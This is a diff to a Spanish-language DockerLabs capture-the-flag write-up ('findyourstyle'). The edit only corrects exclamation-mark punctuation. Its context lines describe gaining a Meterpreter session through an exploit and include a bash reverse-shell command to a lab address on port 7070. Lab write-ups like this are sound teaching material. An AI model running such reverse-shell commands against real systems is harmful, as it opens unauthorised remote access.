@@ -34,7 +34,7 @@ Completaremos las opciones y ejecutaremos el exploit.
 
 ![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_4.jpg)   
 
-Perfecto!  
+¡Perfecto!  
 Hemos obtenido una sessión meterpreter.  
 
 ![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_5.jpg)     
@@ -44,8 +44,8 @@ Para ello, ejecutaremos el comando `shell`, luego escribiremos `/bin/bash` y, po
 
 `bash -i >& /dev/tcp/172.17.0.8/7070 0>&1`  
 
-Perfecto! 
-Ya estamos dentro!  
+¡Perfecto! 
+¡Ya estamos dentro!  
 
 ![F](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/findyourstyle/F_6.jpg)       
 
